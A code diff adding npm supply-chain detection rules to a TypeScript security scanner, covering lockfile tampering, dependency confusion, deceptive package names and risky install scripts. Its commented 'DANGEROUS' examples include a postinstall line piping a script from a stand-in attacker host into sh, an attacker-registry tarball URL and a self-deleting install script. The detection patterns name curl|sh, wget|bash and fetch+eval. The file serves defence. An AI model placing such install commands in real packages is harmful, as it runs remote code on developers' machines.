@@ -144,4 +144,93 @@ export const supplyChainRules: SecurityRule[] = [
       '// DANGEROUS — self-deleting payload:\n// "postinstall": "node setup.js && rm -f setup.js"\n\n// Legitimate scripts don\'t delete themselves:\n"scripts": {\n  "postinstall": "patch-package"\n}',
     compliance: ["SOC2:CC7.1"],
   },
+  {
+    id: "VG870",
+    name: "Lockfile Missing Integrity Hash",
+    severity: "critical",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      "A package in the lockfile (package-lock.json) is missing an integrity hash. Integrity hashes (sha512/sha256) ensure that the downloaded package matches what was originally resolved. Missing hashes indicate possible lockfile tampering — the exact technique used in the Axios supply chain attack (March 2026) where a malicious dependency was injected without proper integrity verification.",
+    pattern:
+      /"node_modules\/[^"]+"\s*:\s*\{[^}]*"resolved"\s*:\s*"[^"]*"(?![^}]*"integrity")[^}]*\}/g,
+    languages: ["json"],
+    fix: "Run `npm install` with a clean node_modules to regenerate integrity hashes. If hashes were manually removed, investigate for lockfile tampering.",
+    fixCode:
+      '// Healthy lockfile entry has integrity hash:\n"node_modules/axios": {\n  "version": "1.7.9",\n  "resolved": "https://registry.npmjs.org/axios/-/axios-1.7.9.tgz",\n  "integrity": "sha512-LhHLbBcJkvZz..."\n}\n\n// DANGEROUS — missing integrity:\n// "node_modules/axios": {\n//   "version": "1.14.1",\n//   "resolved": "https://registry.npmjs.org/axios/-/axios-1.14.1.tgz"\n// }',
+    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
+  },
+  {
+    id: "VG871",
+    name: "Non-Registry Tarball URL in Lockfile",
+    severity: "critical",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      'Lockfile contains a "resolved" URL pointing to a non-official npm registry. Legitimate packages resolve to registry.npmjs.org. Third-party or attacker-controlled registries can serve tampered packages. This is a key indicator of dependency substitution attacks.',
+    pattern:
+      /"resolved"\s*:\s*"https?:\/\/(?!registry\.npmjs\.org\/)[^"]*\.tgz"/g,
+    languages: ["json"],
+    fix: "Verify the package source. If using a private registry, ensure it is your organization's approved registry. Remove any packages resolving to unknown hosts.",
+    fixCode:
+      '// Safe — official npm registry:\n"resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"\n\n// DANGEROUS — unknown registry:\n// "resolved": "https://evil-registry.com/lodash/-/lodash-4.17.21.tgz"',
+    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
+  },
+  {
+    id: "VG872",
+    name: "Dependency Confusion Risk — Unscoped Internal Package Name",
+    severity: "high",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      'Package dependency uses common internal naming patterns (e.g., prefixed with "internal-", "company-", "app-") without an npm scope (@org/). Unscoped packages with internal-sounding names are prime targets for dependency confusion attacks — an attacker publishes a higher-versioned package with the same name on the public registry.',
+    pattern:
+      /"(?:internal-|company-|corp-|private-|infra-|platform-|service-|lib-|shared-|common-|core-|base-|app-|org-|team-|dept-)[a-z0-9-]+":\s*"[\^~]?\d/g,
+    languages: ["json"],
+    fix: "Use npm scopes (@your-org/package-name) for all internal packages. Configure .npmrc to route your scope to your private registry.",
+    fixCode:
+      '// DANGEROUS — unscoped internal package (dependency confusion target):\n"dependencies": {\n  "internal-auth": "^2.1.0"\n}\n\n// Safe — scoped to your org:\n"dependencies": {\n  "@mycompany/internal-auth": "^2.1.0"\n}',
+    compliance: ["SOC2:CC7.1"],
+  },
+  {
+    id: "VG873",
+    name: "Suspicious Package Name — Deceptive Prefix/Suffix Pattern",
+    severity: "high",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      'Dependency uses a deceptive naming pattern that mimics a legitimate package with a prefix or suffix (e.g., "plain-crypto-js" mimicking "crypto-js", "real-lodash" mimicking "lodash"). This is the exact technique used in the Axios NPM supply chain attack (March 2026) where the injected "plain-crypto-js" package was a backdoor disguised as a crypto utility.',
+    pattern:
+      /"(?:plain-|real-|original-|safe-|secure-|true-|actual-|verified-|legit-|official-|clean-|pure-|native-|simple-|fast-|super-|ultra-|better-|enhanced-|improved-|modern-|updated-)[a-z][\w.-]*":\s*"[\^~]?\d/g,
+    languages: ["json"],
+    fix: "Verify the package is legitimate. Check npm for the package author, publication date, and download count. Compare with the well-known package it appears to mimic.",
+    fixCode:
+      '// DANGEROUS — deceptive prefix mimicking crypto-js:\n"dependencies": {\n  "plain-crypto-js": "^1.0.0"\n}\n\n// Safe — use the real package:\n"dependencies": {\n  "crypto-js": "^4.2.0"\n}',
+    compliance: ["SOC2:CC7.1"],
+  },
+  {
+    id: "VG874",
+    name: "Install Script Downloads and Executes Remote Code",
+    severity: "critical",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      "Install script combines download and execution in a single command (e.g., curl|sh, wget|bash, fetch+eval). This is the most dangerous pattern in supply chain attacks — it downloads arbitrary code and immediately executes it with the developer's full permissions.",
+    pattern:
+      /["'](?:post|pre)install["']\s*:\s*["'][^"']*(?:curl[^"']*\|\s*(?:sh|bash|node)|wget[^"']*\|\s*(?:sh|bash|node)|fetch\([^)]*\)[^"']*\.then[^"']*eval|npx\s+[^@\s][^"']*)/gi,
+    languages: ["json"],
+    fix: "Never pipe remote content directly to a shell. Download files first, verify checksums, then execute.",
+    fixCode:
+      '// DANGEROUS — download and execute:\n// "postinstall": "curl https://evil.com/setup.sh | sh"\n\n// Safe — no remote execution in install scripts:\n"scripts": {\n  "postinstall": "prisma generate"\n}',
+    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
+  },
+  {
+    id: "VG875",
+    name: "Lockfile Contains Deprecated SHA-1 Integrity",
+    severity: "medium",
+    owasp: "A03:2025 Software Supply Chain Failures",
+    description:
+      "Lockfile uses SHA-1 integrity hashes instead of SHA-512. SHA-1 is cryptographically broken — collision attacks are practical. An attacker who can produce a SHA-1 collision could substitute a malicious package that passes integrity verification. Modern lockfiles should exclusively use SHA-512.",
+    pattern: /"integrity"\s*:\s*"sha1-[A-Za-z0-9+/=]+"/g,
+    languages: ["json"],
+    fix: "Delete node_modules and package-lock.json, then run `npm install` to regenerate with SHA-512 hashes. Ensure you are using npm >= 7.",
+    fixCode:
+      '// WEAK — SHA-1 integrity (broken algorithm):\n"integrity": "sha1-abc123def456..."\n\n// Strong — SHA-512 integrity:\n"integrity": "sha512-abc123def456ghij..."',
+    compliance: ["SOC2:CC7.1", "PCI-DSS:Req6.5.10"],
+  },
 ];
